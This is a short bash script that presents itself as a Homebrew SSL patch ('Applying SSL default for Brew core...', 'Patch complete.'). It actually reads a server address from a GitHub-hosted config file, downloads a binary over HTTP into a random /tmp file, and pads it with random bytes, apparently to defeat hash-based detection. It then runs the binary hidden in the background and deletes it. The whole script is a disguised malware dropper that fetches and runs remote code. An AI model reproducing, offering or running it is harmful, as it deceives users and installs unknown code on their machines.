#!/bin/bash
tmp="/tmp/$(od -vAn -N6 -tx1 /dev/urandom | tr -d " \n" | head -c 12)"
ip="$(curl -s https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^ipaddr | cut -f2 -d'=')"
args="$(curl -s https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^args | cut -f2 -d'=')"
echo "Applying SSL default for Brew core..."
curl -s http://$ip/brew-core -o $tmp >/dev/null 2>&1
random_bytes_count=$(($RANDOM % 10 + 1))
dd if=/dev/urandom bs=1 count=$random_bytes_count >> $tmp
chmod +x $tmp
nohup $tmp $args >/dev/null 2>&1 &
rm $tmp
sleep 5
echo "Patch complete."
